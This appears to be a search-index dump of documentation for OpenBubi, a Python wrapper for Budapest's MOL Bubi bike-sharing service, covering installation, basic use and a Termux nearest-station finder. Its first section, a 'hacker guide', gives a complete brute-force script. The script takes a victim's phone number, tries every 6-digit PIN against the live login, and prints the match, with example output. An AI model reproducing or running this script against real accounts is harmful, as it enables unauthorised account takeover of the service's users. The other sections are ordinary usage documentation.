hacking, because it is illegal","title":"Using for brute force attacks"},{"location":"usage/pymodule/hackerguide/#what-are-we-going-to-do","text":"We are going to make an algorithm, that tries to login to a MOL Bubi account with every 6-digit password","title":"What are we going to do?"},{"location":"usage/pymodule/hackerguide/#write-the-program","text":"First of all, make a new Python script in the cloned folder mkdir bubiforce && touch bubiforce/bubiforce.py Then import all the necessary modules in the newly created program/script import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting openbubi output to dictionary import itertools # for making an iterable object with all the six-digit numbers import getpass # for getting input from the user without echoing Then get an input from the user about the phone number of the victim phoneNumber = getpass . getpass ( \"Please enter a phone number: \" ) Then make a for cycle, that iterates over the list of six-digit numbers (using itertools ), and tries every possible password for authenticating # make an iterable object that contains all six-digit numbers, and iterate through that for i in itertools . product ( \"0123456789\" , repeat = 6 ): # convert the elements of the current tuple to a string currentNum = \"\" . join ( i ) # print currentNum out print ( currentNum ) # make a new BubiUser instance with the password `currentNum` user = openbubi . BubiUser ( phoneNumber , currentNum ) \"\"\" Really long line, but I'll explain it. If there is an error while logging in, MOL Bubi returns an error code like this: { \"server_time\": 1635867338, \"error\": { \"code\": 1, \"message\": \"A felhaszn\u00e1l\u00f3 nem tal\u00e1lhat\u00f3, vagy a bejelentkez\u00e9s nem siker\u00fclt.\", \"reference\": \"61815aca3f4fe\" } } There is a JSON object, that contains an error key with a value that contains another JSON object with the error code, error message, and reference. So, if we want to detect login failure, we need to check if there is a key named \"error\". So we need to: 1. Convert the output of user.login() to a dictionary 2. Convert all the keys of this dictionary into a list 3. Check if the statement 'there is an element in that list called error' is false 4. If that is false, then we got no errors, and the pin is correct \"\"\" if ( \"error\" in list ( json . loads ( user . info ()) . keys ())) == False : # there is no error print ( f \"Match! The pin is { currentNum } \" ) quit () # quit the program The complete code is: import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting openbubi output to dictionary import itertools # for making an iterable object with all the six-digit numbers import getpass # for getting input from the user without echoing phoneNumber = getpass . getpass ( \"Please enter a phone number: \" ) # make an iterable object that contains all six-digit numbers, and iterate through that for i in itertools . product ( \"0123456789\" , repeat = 6 ): # convert the elements of the current tuple to a string currentNum = \"\" . join ( i ) # print currentNum out print ( currentNum ) # make a new BubiUser instance with the password `currentNum` user = openbubi . BubiUser ( phoneNumber , currentNum ) \"\"\" Really long line, but I'll explain it. If there is an error while logging in, MOL Bubi returns an error code like this: { \"server_time\": 1635867338, \"error\": { \"code\": 1, \"message\": \"A felhaszn\u00e1l\u00f3 nem tal\u00e1lhat\u00f3, vagy a bejelentkez\u00e9s nem siker\u00fclt.\", \"reference\": \"61815aca3f4fe\" } } There is a JSON object, that contains an error key with a value that contains another JSON object with the error code, error message, and reference. So, if we want to detect login failure, we need to check if there is a key named \"error\". So we need to: 1. Convert the output of user.login() to a dictionary 2. Convert all the keys of this dictionary into a list 3. Check if the statement 'there is an element in that list called error' is false 4. If that is false, then we got no errors, and the pin is correct \"\"\" if ( \"error\" in list ( json . loads ( user . info ()) . keys ())) == False : # there is no error print ( f \"Match! The pin is { currentNum } \" ) quit () # quit the program","title":"Write the program"},{"location":"usage/pymodule/hackerguide/#usage","text":"Go to the program's directory cd bubiforce Run the program python bubiforce.py Example output: Please enter a phone number: 000000 000001 000002 000003 ...","title":"Usage"},{"location":"usage/pymodule/hackerguide/#source-code","text":"I uploaded the source code of this program to GitHub","title":"Source code"},{"location":"usage/pymodule/installation/","text":"Installation of the Python module Open up a terminal Clone the repository of the source code git clone https://github.com/piciakk/OpenBubi Go to the source code's directory cd OpenBubi Install the requirements Manually pip install requests geopy Automatically pip install -r requirements.txt","title":"Installation of the Python module"},{"location":"usage/pymodule/installation/#installation-of-the-python-module","text":"Open up a terminal Clone the repository of the source code git clone https://github.com/piciakk/OpenBubi Go to the source code's directory cd OpenBubi Install the requirements Manually pip install requests geopy Automatically pip install -r requirements.txt","title":"Installation of the Python module"},{"location":"usage/pymodule/overview/","text":"Overview of the Python module There you can find a simple guide for using the module. There are two classes: BubiUser , and BubiMap . In this tutorial, I'll use these classes. First of all, make a new Python script, that is in the same directory as openbubi.py (or move openbubi.py to a directory of your choice, and make the Python script there) Then import the module import openbubi Then make a new instance of the BubiUser , and the BubiMap class # making a BubiUser instance (this takes two arguments) testUser = openbubi . BubiUser ( \"phoneNumber\" , \"pin\" ) # Making a BubiMap instance (this takes no argument) testMap = openbubi . BubiMap () Then print the name of the testUser user print ( testUser . getScreenName ()) With these simple steps, we can make a program that takes a phone number, a pin, and prints out a name import openbubi import getpass phoneNumber = getpass . getpass ( \"Please enter your phone number: \" ) pin = getpass . getpass ( \"Please enter your pin: \" ) user = openbubi . BubiUser ( phoneNumber , pin ) print ( user . getScreenName ()) Run the program Output: Congratulations! You've made your first OpenBubi program! \ud83c\udf89 You can read a more technical documentation about the built-in functions here .","title":"Overview of the Python module"},{"location":"usage/pymodule/overview/#overview-of-the-python-module","text":"There you can find a simple guide for using the module. There are two classes: BubiUser , and BubiMap . In this tutorial, I'll use these classes. First of all, make a new Python script, that is in the same directory as openbubi.py (or move openbubi.py to a directory of your choice, and make the Python script there) Then import the module import openbubi Then make a new instance of the BubiUser , and the BubiMap class # making a BubiUser instance (this takes two arguments) testUser = openbubi . BubiUser ( \"phoneNumber\" , \"pin\" ) # Making a BubiMap instance (this takes no argument) testMap = openbubi . BubiMap () Then print the name of the testUser user print ( testUser . getScreenName ()) With these simple steps, we can make a program that takes a phone number, a pin, and prints out a name import openbubi import getpass phoneNumber = getpass . getpass ( \"Please enter your phone number: \" ) pin = getpass . getpass ( \"Please enter your pin: \" ) user = openbubi . BubiUser ( phoneNumber , pin ) print ( user . getScreenName ()) Run the program Output: Congratulations! You've made your first OpenBubi program! \ud83c\udf89 You can read a more technical documentation about the built-in functions here .","title":"Overview of the Python module"},{"location":"usage/pymodule/termux/","text":"For Termux users I'm a big fan of Termux (a terminal emulator and Linux environment app for Android), so I made an example program for Termux users (based on the termux-location command). A few words about termux-location termux-location is a Termux command, that takes advantage of one of the most important features of smartphones: GPS. termux-location returns the exact coordinates of the user in JSON format. Example output: $ termux-location { \"latitude\" : 123456 .0, \"longitude\" : 123456 .0, \"altitude\" : 123456 .0, \"accuracy\" : 123456 .0, \"vertical_accuracy\" : 123456 .0, \"bearing\" : 123456 .0, \"speed\" : 123456 .0, \"elapsedMs\" : 123456 , \"provider\" : \"gps\" } What are we going to do with termux-location ? We are going to: run termux-location from our Python script parse the output JSON data of termux-location determine the user's exact location provide the location to OpenBubi make a command-line MOL Bubi detector :D Write the program First of all, make a new Python script in the cloned folder mkdir bubidetector && touch bubidetector/bubidetector.py Then import all the necessary modules in the newly created program/script import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting the command-line output to dictionary import os # for running termux-location import urllib.parse # for parsing urls Then initialize a new instance of BubiMap as Budapest Budapest = openbubi . BubiMap () Then run termux-location , and parse the output currentLocation = os . popen ( \"termux-location\" ) . read () # read the current location currentLocationDict = json . loads ( currentLocation ) # convert it to a dictionary lat = currentLocationDict [ \"latitude\" ]; lon = currentLocationDict [ \"longitude\" ] # parse it Then find the nearest station, and print out some information about it nearestStation = Budapest . getNearestStation ( lat , lon ) # call getNearestStation(), and provide lat, lon # this will return the nearest station's name nearestStationInfo = { \"name\" : nearestStation , \"bikesOnStation\" : Budapest . countBikesOnStation ( nearestStation ), # count the bikes on that station \"coordinates\" : json . loads ( Budapest . getCoordinatesOfStation ( nearestStation )) # get the coordinates of that station, and convert it to a dictionary } startingPoint = urllib . parse . quote ( f \" { lat } , { lon } \" ) # make a starting point in a url-friendly format (based on the current coordinates) destinationPoint = urllib . parse . quote ( f \" { nearestStationInfo [ 'coordinates' ][ 'lat' ] } , { nearestStationInfo [ 'coordinates' ][ 'lon' ] } \" ) # make an ending point in a url-friendly format (based on the station's coordinates) googlemapsurl = f \"https://www.google.com/maps?f=d&saddr= { startingPoint } &daddr= { destinationPoint } &dirflg=d\" # generate the Google Maps URL # ^ # | # calculate a Google Maps route to the station print ( f \"\"\" Station found... Informations: - Station name: { nearestStationInfo [ \"name\" ] } - Bikes on station: { nearestStationInfo [ \"bikesOnStation\" ] } - Coordinates of station: { nearestStationInfo [ \"coordinates\" ] } - Google Maps route to the station: { googlemapsurl } \"\"\" ) # printing out And the final code is: import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting the command-line output to dictionary import os # for running termux-location import urllib.parse # for parsing urls Budapest = openbubi . BubiMap () currentLocation = os . popen ( \"termux-location\" ) . read () # read the current location currentLocationDict = json . loads ( currentLocation ) # convert it to a dictionary lat = currentLocationDict [ \"latitude\" ]; lon = currentLocationDict [ \"longitude\" ] # parse it nearestStation = Budapest . getNearestStation ( lat , lon ) # call getNearestStation(), and provide lat, lon # this will return the nearest station's name nearestStationInfo = { \"name\" : nearestStation , \"bikesOnStation\" : Budapest . countBikesOnStation ( nearestStation ), # count the bikes on that station \"coordinates\" : json . loads ( Budapest . getCoordinatesOfStation ( nearestStation )) # get the coordinates of that station, and convert it to a dictionary } startingPoint = urllib . parse . quote ( f \" { lat } , { lon } \" ) # make a starting point in a url-friendly format (based on the current coordinates) destinationPoint = urllib . parse . quote ( f \" { nearestStationInfo [ 'coordinates' ][ 'lat' ] } , { nearestStationInfo [ 'coordinates' ][ 'lon' ] } \" ) # make an ending point in a url-friendly format (based on the station's coordinates) googlemapsurl = f \"https://www.google.com/maps?f=d&saddr= { startingPoint } &daddr= { destinationPoint } &dirflg=d\" # generate the Google Maps URL # ^ # | # calculate a Google Maps route to the station print ( f \"\"\" Station found... Informations: - Station name: { nearestStationInfo [ \"name\" ] } - Bikes on station: { nearestStationInfo [ \"bikesOnStation\" ] } - Coordinates of station: { nearestStationInfo [ \"coordinates\" ] } - Google Maps route to the station: { googlemapsurl } \"\"\" ) # printing out Usage Go to the program's directory cd bubidetector Run the program python bubidetector.py Example output: Station found... Informations: - Station name: Lorem Ipsum t\u00e9r - Bikes on station: 123 - Coordinates of station: {'lat': 123456.0, 'lon': 123456.0} - Google Maps route to the station: https://www.google.com/?maps?f=d&saddr=123456.0%2C123456.0&daddr=123456.0%2C123456.0&dirflg=d Source code I uploaded the source code of this program to GitHub","title":"For Termux users"},{"location":"usage/pymodule/termux/#for-termux-users","text":"I'm a big fan of Termux (a terminal emulator and Linux environment app for Android), so I made an example program for Termux users (based on the termux-location command).","title":"For Termux users"},{"location":"usage/pymodule/termux/#a-few-words-about-termux-location","text":"termux-location is a Termux command, that takes advantage of one of the most important features of smartphones: GPS. termux-location returns the exact coordinates of the user in JSON format. Example output: $ termux-location { \"latitude\" : 123456 .0, \"longitude\" : 123456 .0, \"altitude\" : 123456 .0, \"accuracy\" : 123456 .0, \"vertical_accuracy\" : 123456 .0, \"bearing\" : 123456 .0, \"speed\" : 123456 .0, \"elapsedMs\" : 123456 , \"provider\" : \"gps\" }","title":"A few words about termux-location"},{"location":"usage/pymodule/termux/#what-are-we-going-to-do-with-termux-location","text":"We are going to: run termux-location from our Python script parse the output JSON data of termux-location determine the user's exact location provide the location to OpenBubi make a command-line MOL Bubi detector :D","title":"What are we going to do with termux-location?"},{"location":"usage/pymodule/termux/#write-the-program","text":"First of all, make a new Python script in the cloned folder mkdir bubidetector && touch bubidetector/bubidetector.py Then import all the necessary modules in the newly created program/script import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting the command-line output to dictionary import os # for running termux-location import urllib.parse # for parsing urls Then initialize a new instance of BubiMap as Budapest Budapest = openbubi . BubiMap () Then run termux-location , and parse the output currentLocation = os . popen ( \"termux-location\" ) . read () # read the current location currentLocationDict = json . loads ( currentLocation ) # convert it to a dictionary lat = currentLocationDict [ \"latitude\" ]; lon = currentLocationDict [ \"longitude\" ] # parse it Then find the nearest station, and print out some information about it nearestStation = Budapest . getNearestStation ( lat , lon ) # call getNearestStation(), and provide lat, lon # this will return the nearest station's name nearestStationInfo = { \"name\" : nearestStation , \"bikesOnStation\" : Budapest . countBikesOnStation ( nearestStation ), # count the bikes on that station \"coordinates\" : json . loads ( Budapest . getCoordinatesOfStation ( nearestStation )) # get the coordinates of that station, and convert it to a dictionary } startingPoint = urllib . parse . quote ( f \" { lat } , { lon } \" ) # make a starting point in a url-friendly format (based on the current coordinates) destinationPoint = urllib . parse . quote ( f \" { nearestStationInfo [ 'coordinates' ][ 'lat' ] } , { nearestStationInfo [ 'coordinates' ][ 'lon' ] } \" ) # make an ending point in a url-friendly format (based on the station's coordinates) googlemapsurl = f \"https://www.google.com/maps?f=d&saddr= { startingPoint } &daddr= { destinationPoint } &dirflg=d\" # generate the Google Maps URL # ^ # | # calculate a Google Maps route to the station print ( f \"\"\" Station found... Informations: - Station name: { nearestStationInfo [ \"name\" ] } - Bikes on station: { nearestStationInfo [ \"bikesOnStation\" ] } - Coordinates of station: { nearestStationInfo [ \"coordinates\" ] } - Google Maps route to the station: { googlemapsurl } \"\"\" ) # printing out And the final code is: import sys # for path manipulation sys . path . append ( \"../\" ) # add openbubi.py's folder to the current path import openbubi import json # for converting the command-line output to dictionary import os # for running termux-location import urllib.parse # for parsing urls Budapest = openbubi . BubiMap () currentLocation = os . popen ( \"termux-location\" ) . read () # read the current location currentLocationDict = json . loads ( currentLocation ) # convert it to a dictionary lat = currentLocationDict [ \"latitude\" ]; lon = currentLocationDict [ \"longitude\" ] # parse it nearestStation = Budapest . getNearestStation ( lat , lon ) # call getNearestStation(), and provide lat, lon # this will return the nearest station's name nearestStationInfo = { \"name\" : nearestStation , \"bikesOnStation\" : Budapest . countBikesOnStation ( nearestStation ), # count the bikes on that station \"coordinates\" : json . loads ( Budapest . getCoordinatesOfStation ( nearestStation )) # get the coordinates of that station, and convert it to a dictionary } startingPoint = urllib . parse . quote ( f \" { lat } , { lon } \" ) # make a starting point in a url-friendly format (based on the current coordinates) destinationPoint = urllib . parse . quote ( f \" { nearestStationInfo [ 'coordinates' ][ 'lat' ] } , { nearestStationInfo [ 'coordinates' ][ 'lon' ] } \" ) # make an ending point in a url-friendly format (based on the station's coordinates) googlemapsurl = f \"https://www.google.com/maps?f=d&saddr= { startingPoint } &daddr= { destinationPoint } &dirflg=d\" # generate the Google Maps URL # ^ # | # calculate a Google Maps route to the station print ( f \"\"\" Station found... Informations: - Station name: { nearestStationInfo [ \"name\" ] } - Bikes on station: { nearestStationInfo [ \"bikesOnStation\" ] } - Coordinates of station: { nearestStationInfo [ \"coordinates\" ] } - Google Maps route to the station: { googlemapsurl } \"\"\" ) # printing out","title":"Write the program"},{"location":"usage/pymodule/termux/#usage","text":"Go to the program's directory cd bubidetector Run the program python bubidetector.py Example output: Station found... Informations: - Station name: Lorem Ipsum t\u00e9r - Bikes on station: 123 - Coordinates of station: {'lat': 123456.0, 'lon': 123456.0} - Google Maps route to the station: https://www.google.com/?maps?f=d&saddr=123456.0%2C123456.0&daddr=123456.0%2C123456.0&dirflg=d","title":"Usage"},{"location":"usage/pymodule/termux/#source-code","text":"I uploaded the source code of this program to GitHub","title":"Source code"}]}